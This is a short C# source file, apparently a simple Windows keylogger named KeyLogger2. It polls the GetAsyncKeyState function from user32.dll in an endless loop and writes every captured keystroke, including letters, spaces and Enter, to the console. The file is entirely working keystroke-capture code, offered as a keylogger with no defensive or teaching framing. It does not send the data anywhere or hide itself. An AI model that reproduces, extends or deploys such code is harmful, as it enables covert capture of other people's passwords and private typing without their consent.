using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace KeyLogger2 {
    public class KeyLogger {
        [DllImport("user32.dll")]
        private static extern int GetAsyncKeyState(Int32 i);

        private static String FormatString(int i) {
            if ((Keys) i == Keys.Space) {
                return " ";
            }
            if ((Keys)i == Keys.Enter) {
                return "\n";
            }
            
            String s = ((Keys) i).ToString();
            return (s.Length == 1) ? s : "";
        }

        public static void Run() {
            while (true) {
                Thread.Sleep(100);
                for (int i = 0; i < 255; i++) {
                    int state = GetAsyncKeyState(i);
                    if (state != 0) {
                        Console.Write(FormatString(i));
                    }
                }
            }    
        }
    }
}